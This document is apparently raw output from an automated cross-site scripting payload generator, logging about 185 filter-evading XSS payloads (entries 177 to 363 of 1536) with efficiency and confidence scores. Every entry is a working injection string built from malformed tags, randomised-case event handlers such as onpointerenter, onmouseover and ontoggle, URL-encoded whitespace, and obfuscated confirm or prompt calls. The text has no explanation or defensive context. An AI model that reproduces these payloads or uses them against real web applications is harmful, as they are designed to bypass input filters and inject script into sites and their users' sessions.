 Progress: 177/1536 ------------------------------------------------------------
 Payload: <D3V%0aoNPOINteReNTer%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 178/1536  Progress: 179/1536  Progress: 180/1536  Progress: 181/1536 ------------------------------------------------------------
 Payload: <D3v%0aONpoIntERenteR%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 182/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnmouseoVEr%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 183/1536 ------------------------------------------------------------
 Payload: <d3V%09onPoinTeRENTer%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 184/1536 ------------------------------------------------------------
 Payload: <DEtails%09onpOInTereNTer%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 185/1536 ------------------------------------------------------------
 Payload: <D3v/+/onpoInTerEnTER%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 186/1536 ------------------------------------------------------------
 Payload: <hTml%09ONmoUSeoVEr+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 187/1536 ------------------------------------------------------------
 Payload: <A%09oNpoINTEreNteR%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 188/1536 ------------------------------------------------------------
 Payload: <dEtaIls/+/ONpoINTERENTER%09=%09(prompt)``// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 189/1536 ------------------------------------------------------------
 Payload: <hTml%09OnpOinTEreNtER%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 190/1536 ------------------------------------------------------------
 Payload: <a%09ONPoInteReNter%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 191/1536 ------------------------------------------------------------
 Payload: <d3V%09ONpoINtERENtER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 192/1536 ------------------------------------------------------------
 Payload: <A%0aoNPOINtErENTEr%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 193/1536 ------------------------------------------------------------
 Payload: <htMl%0doNpOINteRENTer%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 194/1536 ------------------------------------------------------------
 Payload: <DetaiLs%0aOnPoInTEreNTER+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 195/1536 ------------------------------------------------------------
 Payload: <htMl/+/ONPOInTerENter%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 196/1536  Progress: 197/1536 ------------------------------------------------------------
 Payload: <dEtaiLs/+/OnToggLe%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 198/1536 ------------------------------------------------------------
 Payload: <DEtaILs%0aoNTOggle+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 199/1536 ------------------------------------------------------------
 Payload: <A%0aonmouseOVER%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 200/1536 ------------------------------------------------------------
 Payload: <A%0doNPOintErEntEr%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 201/1536 ------------------------------------------------------------
 Payload: <D3V/+/ONMousEOVEr%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 202/1536 ------------------------------------------------------------
 Payload: <A%0dONpOInteReNTeR+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 203/1536 ------------------------------------------------------------
 Payload: <D3v%0doNmOUSeOvEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 204/1536 ------------------------------------------------------------
 Payload: <a%0aOnpOiNTeREnter%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 205/1536  Progress: 206/1536 ------------------------------------------------------------
 Payload: <a%0aonpoInTERenteR%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 207/1536 ------------------------------------------------------------
 Payload: <hTml/+/onPoIntERENtEr+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 208/1536 ------------------------------------------------------------
 Payload: <D3v%0aoNPoiNterEnTER%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 209/1536 ------------------------------------------------------------
 Payload: <a%0doNMOUSeover%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 210/1536 ------------------------------------------------------------
 Payload: <A%09oNPoINteReNteR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 211/1536 ------------------------------------------------------------
 Payload: <HtmL%0doNmOusEovEr%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 212/1536 ------------------------------------------------------------
 Payload: <DeTAiLS%0donPoINTerEnteR%0a=%0a(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 213/1536 ------------------------------------------------------------
 Payload: <HtMl%09ONMouSEOVer+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 214/1536 ------------------------------------------------------------
 Payload: <d3v/+/ONpOintereNtER%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 215/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnpOInterenTEr+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 216/1536 ------------------------------------------------------------
 Payload: <a%0aOnpoINtereNTeR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 217/1536 ------------------------------------------------------------
 Payload: <a%0doNpOInTerentER+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 218/1536 ------------------------------------------------------------
 Payload: <a%0dONmoUSEovER+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 219/1536 ------------------------------------------------------------
 Payload: <A%0dONpOintErEnTEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 220/1536 ------------------------------------------------------------
 Payload: <hTmL%09oNmouSEoVEr%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 221/1536 ------------------------------------------------------------
 Payload: <dETAIlS%0aoNPointerenter%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 222/1536 ------------------------------------------------------------
 Payload: <HTmL%0aonPOiNTErENter+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 223/1536 ------------------------------------------------------------
 Payload: <d3V%09ONMOuSEover%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 224/1536 ------------------------------------------------------------
 Payload: <d3V%09ONpOinteRenteR%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 225/1536 ------------------------------------------------------------
 Payload: <A/+/ONPOinterENteR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 226/1536 ------------------------------------------------------------
 Payload: <D3V%0aoNPointeREnTEr%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 227/1536 ------------------------------------------------------------
 Payload: <HTML%0aonpoinTErenTEr+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 228/1536 ------------------------------------------------------------
 Payload: <D3v%0dONPoiNtEREnTer+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 229/1536 ------------------------------------------------------------
 Payload: <a/+/oNMOuSEOVer%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 230/1536 ------------------------------------------------------------
 Payload: <deTaILS%09ONPoiNtErENTer+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 231/1536 ------------------------------------------------------------
 Payload: <htML%0dOnPOInTERenTeR%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 232/1536 ------------------------------------------------------------
 Payload: <D3v%0dONpOInterEnteR%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 233/1536 ------------------------------------------------------------
 Payload: <d3V%0aONMOUsEOvER+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 234/1536 ------------------------------------------------------------
 Payload: <HTMl%0dONMouSeOVeR%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 235/1536 ------------------------------------------------------------
 Payload: <DEtaILS/+/ONPOINTErentER%0d=%0d(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 236/1536 ------------------------------------------------------------
 Payload: <D3V%0dONmouseovEr%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 237/1536 ------------------------------------------------------------
 Payload: <D3V%09OnmOUSeOvEr%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 238/1536 ------------------------------------------------------------
 Payload: <D3V%09ONpointERentEr%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 239/1536 ------------------------------------------------------------
 Payload: <A/+/oNmouSeOvEr%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 240/1536 ------------------------------------------------------------
 Payload: <DetAILS%0aONtoGglE+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 241/1536 ------------------------------------------------------------
 Payload: <DEtAILs/+/ONpOinTerEnTER%0d=%0d(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 242/1536 ------------------------------------------------------------
 Payload: <A%0donPoinTERENTER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 243/1536 ------------------------------------------------------------
 Payload: <detAIlS%0aOnToGgLe%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 244/1536 ------------------------------------------------------------
 Payload: <htML%0dONmoUSeOver%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 245/1536 ------------------------------------------------------------
 Payload: <HtML%0doNPointErENtER%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 246/1536  Progress: 247/1536  Progress: 248/1536 ------------------------------------------------------------
 Payload: <d3V%0doNMOusEovEr%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 249/1536 ------------------------------------------------------------
 Payload: <HTML%0aONmousEoveR+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 250/1536 ------------------------------------------------------------
 Payload: <d3V%0aONMOUsEoVer+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 251/1536 ------------------------------------------------------------
 Payload: <d3V/+/OnmoUsEover%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 252/1536 ------------------------------------------------------------
 Payload: <A/+/ONMoUseoVeR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 253/1536 ------------------------------------------------------------
 Payload: <A%09OnmoUseOver%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 254/1536 ------------------------------------------------------------
 Payload: <DETAilS%0dOntOGgLE+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 255/1536 ------------------------------------------------------------
 Payload: <A%0aOnmouSEoVeR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 256/1536 ------------------------------------------------------------
 Payload: <A%0dOnmOuseovEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 257/1536 ------------------------------------------------------------
 Payload: <a%0doNMouseOVEr%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 258/1536 ------------------------------------------------------------
 Payload: <htmL%0aonMoUseover%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 259/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONmouSeOVer%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 260/1536 ------------------------------------------------------------
 Payload: <A%0aONMOuSEoVeR%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 261/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnpoiNTErEntER%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 262/1536 ------------------------------------------------------------
 Payload: <HTmL/+/ONpOiNTeRENTer%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 263/1536 ------------------------------------------------------------
 Payload: <A%09ONmouSeovEr%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 264/1536 ------------------------------------------------------------
 Payload: <A%09ONMOUSEOVeR+=+a=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 265/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnmOuSEoVEr%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 266/1536 ------------------------------------------------------------
 Payload: <HtMl/+/oNMouSEOVEr%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 267/1536 ------------------------------------------------------------
 Payload: <d3v%0doNPoInTEREnteR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 268/1536 ------------------------------------------------------------
 Payload: <A%09OnPOiNtereNteR+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 269/1536 ------------------------------------------------------------
 Payload: <hTML/+/ONmoUSeOVER+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 270/1536 ------------------------------------------------------------
 Payload: <HTmL%0aonPoINteRentER+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 271/1536 ------------------------------------------------------------
 Payload: <Html%0dOnPoiNteRenTeR%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 272/1536 ------------------------------------------------------------
 Payload: <A%09oNpoINTEREnTEr+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 273/1536 ------------------------------------------------------------
 Payload: <a%09oNPOINtERENteR%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 274/1536 ------------------------------------------------------------
 Payload: <htmL/+/ONMousEovEr%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 275/1536 ------------------------------------------------------------
 Payload: <dETaIls%09oNTOggLE+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 276/1536 ------------------------------------------------------------
 Payload: <A%09ONmoUsEoVER+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 277/1536 ------------------------------------------------------------
 Payload: <D3V%09OnMoUSEoVER%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 278/1536 ------------------------------------------------------------
 Payload: <a%0aonpOInterEnTEr+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 279/1536  Progress: 280/1536 ------------------------------------------------------------
 Payload: <htMl%0aoNpoIntErenTEr%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 281/1536 ------------------------------------------------------------
 Payload: <D3V%0dOnMOUSeover+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 282/1536 ------------------------------------------------------------
 Payload: <A/+/OnpoINTErEnteR%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 283/1536 ------------------------------------------------------------
 Payload: <D3v%09oNMoUseoveR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 284/1536 ------------------------------------------------------------
 Payload: <DETaIls/+/oNPoINTeREnter%09=%09[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 285/1536 ------------------------------------------------------------
 Payload: <D3v%0aONmOUSEovER%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 286/1536 ------------------------------------------------------------
 Payload: <A%0aoNPOintEReNtEr%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 287/1536 ------------------------------------------------------------
 Payload: <A%0aONMouSeovER%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 288/1536 ------------------------------------------------------------
 Payload: <html%0aOnMOuSeovER%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 289/1536 ------------------------------------------------------------
 Payload: <a/+/ONMOuSEoVER%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 290/1536 ------------------------------------------------------------
 Payload: <d3v%0aONmouSeOVeR%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 291/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONpOInterENteR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 292/1536 ------------------------------------------------------------
 Payload: <html%0aOnpOiNtERENter%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 293/1536 ------------------------------------------------------------
 Payload: <HTMl%0dONPOinTeREnteR+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 294/1536 ------------------------------------------------------------
 Payload: <hTML/+/ONpOInTErEnTer%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 295/1536  Progress: 296/1536  Progress: 297/1536 ------------------------------------------------------------
 Payload: <DeTAILS%09oNpOInTErENtER%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 298/1536 ------------------------------------------------------------
 Payload: <D3V%0aonMoUseoVer+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 299/1536 ------------------------------------------------------------
 Payload: <hTml%09ONpOINtERENTer%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 300/1536 ------------------------------------------------------------
 Payload: <D3V%0dONpOiNtereNTER%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 301/1536 ------------------------------------------------------------
 Payload: <html%09onPOintEReNTEr%0d=%0d(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 302/1536 ------------------------------------------------------------
 Payload: <d3V/+/OnMouSEOVer+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 303/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNPointERenTer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 304/1536 ------------------------------------------------------------
 Payload: <hTML%0dONMoUseovEr%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 305/1536  Progress: 306/1536 ------------------------------------------------------------
 Payload: <d3v%0aONmOuseOvEr+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 307/1536 ------------------------------------------------------------
 Payload: <D3V/+/OnpoINtERentEr%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 308/1536 ------------------------------------------------------------
 Payload: <hTMl%0donmOUsEOVEr%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 309/1536 ------------------------------------------------------------
 Payload: <A%0aOnMoUSeover%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 310/1536 ------------------------------------------------------------
 Payload: <DETailS%09onPOIntEReNteR%0d=%0d(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 311/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNPOIntERENTER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 312/1536 ------------------------------------------------------------
 Payload: <a/+/onMOuSEOvEr%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 313/1536 ------------------------------------------------------------
 Payload: <detAIlS%0aOnpoinTeRENTER%0a=%0a[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 314/1536 ------------------------------------------------------------
 Payload: <a/+/OnmoUseOvEr+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 315/1536 ------------------------------------------------------------
 Payload: <a/+/OnmouseOVeR%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 316/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnpoiNtErENTer+=+(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 317/1536 ------------------------------------------------------------
 Payload: <a%0dOnPOintEReNTEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 318/1536 ------------------------------------------------------------
 Payload: <A/+/oNMoUsEoVER%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 319/1536 ------------------------------------------------------------
 Payload: <DEtAILs/+/onToggLE%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 320/1536 ------------------------------------------------------------
 Payload: <d3v/+/ONmOuseOVer%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 321/1536 ------------------------------------------------------------
 Payload: <DetAIlS%0dONpOiNTERENTER+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 322/1536 ------------------------------------------------------------
 Payload: <D3v%0dOnmOuSEOvER%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 323/1536 ------------------------------------------------------------
 Payload: <D3V%0dOnmOuseoVeR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 324/1536 ------------------------------------------------------------
 Payload: <A%0dONMOuSEoVer%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 325/1536 ------------------------------------------------------------
 Payload: <d3V%0dONpOintEREnTeR%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 326/1536 ------------------------------------------------------------
 Payload: <a%0donmoUseOVEr%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 327/1536  Progress: 328/1536 ------------------------------------------------------------
 Payload: <deTaIls%09onpOiNterentER%0a=%0aa=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 329/1536 ------------------------------------------------------------
 Payload: <D3V%0dONpOINtEREnTeR%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 330/1536 ------------------------------------------------------------
 Payload: <DEtAILs%0dONPoInTeRENTEr%0a=%0aa=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 331/1536 ------------------------------------------------------------
 Payload: <HTml%0doNpOintERenTEr+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 332/1536 ------------------------------------------------------------
 Payload: <d3V%0donPoINTereNTEr+=+(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 333/1536 ------------------------------------------------------------
 Payload: <a/+/onmOUSEOveR%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 334/1536  Progress: 335/1536 ------------------------------------------------------------
 Payload: <dETaiLs/+/oNpoIntErENTer%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 336/1536 ------------------------------------------------------------
 Payload: <HTmL%09oNPOintERenTER%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 337/1536 ------------------------------------------------------------
 Payload: <htMl%0donpoINTerenTEr%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 338/1536 ------------------------------------------------------------
 Payload: <D3v/+/oNmouSeOvEr%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 339/1536 ------------------------------------------------------------
 Payload: <DETaiLs/+/OnpOintEREnteR+=+[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 340/1536 ------------------------------------------------------------
 Payload: <HTML%0aoNPOinterENTeR%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 341/1536 ------------------------------------------------------------
 Payload: <a%09ONpoiNTErENteR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 342/1536 ------------------------------------------------------------
 Payload: <D3V%09ONPOINTErENTeR+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 343/1536 ------------------------------------------------------------
 Payload: <HTMl%0aONpOINTEReNTEr%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 344/1536 ------------------------------------------------------------
 Payload: <DEtaILS%0aoNpOIntERENTEr%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 345/1536 ------------------------------------------------------------
 Payload: <DETAiLs%0dONToGglE+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 346/1536 ------------------------------------------------------------
 Payload: <D3V/+/OnmOuSEOver+=+(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 347/1536 ------------------------------------------------------------
 Payload: <deTaiLs%0aONtOGgle%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 348/1536 ------------------------------------------------------------
 Payload: <D3V%0aOnMOuSEOVer%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 349/1536 ------------------------------------------------------------
 Payload: <DetAILS%0aONtOgGLE%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 350/1536 ------------------------------------------------------------
 Payload: <htmL%0doNMoUsEoVeR%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 351/1536 ------------------------------------------------------------
 Payload: <Html/+/oNmoUSEOVEr%09=%09(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 352/1536 ------------------------------------------------------------
 Payload: <a/+/onpOInteREntER%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 353/1536 ------------------------------------------------------------
 Payload: <D3v%0aONMouSEoVer%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 354/1536 ------------------------------------------------------------
 Payload: <detAIlS%0dOnPoinTErEnTer%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 355/1536 ------------------------------------------------------------
 Payload: <htMl%09ONpoINTEReNTer+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 356/1536 ------------------------------------------------------------
 Payload: <a%09onMouSeoVer%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 357/1536 ------------------------------------------------------------
 Payload: <DetAiLs%09onpoINtEReNTEr%0d=%0d(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 358/1536 ------------------------------------------------------------
 Payload: <hTml/+/oNMoUsEoveR+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 359/1536 ------------------------------------------------------------
 Payload: <detaiLs/+/oNtOggLE%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 360/1536 ------------------------------------------------------------
 Payload: <dETAILS%0aonTOGGLe+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 361/1536 ------------------------------------------------------------
 Payload: <HTmL%0aOnpoinTEReNTEr+=+(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 362/1536 ------------------------------------------------------------
 Payload: <dETaiLS%09oNTOGgle%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 363/1536 ------------------------------------------------------------
